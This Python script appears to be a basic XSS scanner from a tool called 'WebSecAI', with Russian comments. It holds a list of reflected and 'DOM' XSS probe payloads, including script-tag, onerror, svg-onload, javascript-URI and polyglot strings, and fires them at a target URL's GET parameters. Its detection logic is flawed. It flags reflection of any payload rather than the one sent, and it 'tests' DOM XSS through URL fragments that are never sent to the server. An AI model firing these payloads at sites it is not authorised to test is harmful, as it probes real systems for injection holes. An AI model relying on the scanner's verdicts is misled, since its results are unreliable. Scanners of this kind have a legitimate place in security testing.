import requests
from urllib.parse import urlencode

# 🆕 Расширенные payloads (DOM + Reflected)
XSS_PAYLOADS = [
    # Reflected
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    # DOM XSS (Juice Shop!)
    "<iframe src=javascript:alert('xss')>",
    "javascript:alert(1)",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(1)//",
    # Hash-based
    "#<img src=x onerror=alert(1)>",
    "?q=<script>alert(1)</script>#",
]

# 🆕 Контексты вставки
PARAMS = ["q", "query", "search", "s", "test", "data", "input"]

def scan_xss_basic(url: str):
    results = []
    
    for param in PARAMS:
        for payload in XSS_PAYLOADS:
            # 1. GET param
            test_url = f"{url}?{urlencode({param: payload})}"
            
            try:
                resp = requests.get(test_url, timeout=8)
                reflected = any(p in resp.text for p in XSS_PAYLOADS[:3])  # Только HTML payloads
                
                # 2. HASH param (DOM XSS!)
                hash_url = f"{url}?{param}=test#{payload}"
                resp_hash = requests.get(hash_url, timeout=5)
                hash_suspicious = len(resp_hash.text) != len(resp.text)  # Response change
                
                results.append({
                    "param": param,
                    "payload": payload[:30] + "..." if len(payload)>30 else payload,
                    "url": test_url,
                    "reflected": reflected,
                    "hash_change": hash_suspicious,
                    "suspicious": reflected or hash_suspicious
                })
                
            except:
                results.append({"param": param, "suspicious": False})
    
    return results

def scan_xss(url: str) -> bool:
    """WebSecAI wrapper"""
    print(f"🔍 XSS scan: {url}")
    results = scan_xss_basic(url)
    
    suspicious = [r for r in results if r.get("suspicious")]
    if suspicious:
        print(f"🟡 XSS found: {len(suspicious)} vectors!")
        for r in suspicious[:3]:  # Top 3
            print(f"  → {r['param']}={r['payload']}")
        return True
    
    print("🟢 XSS clean")
    return False
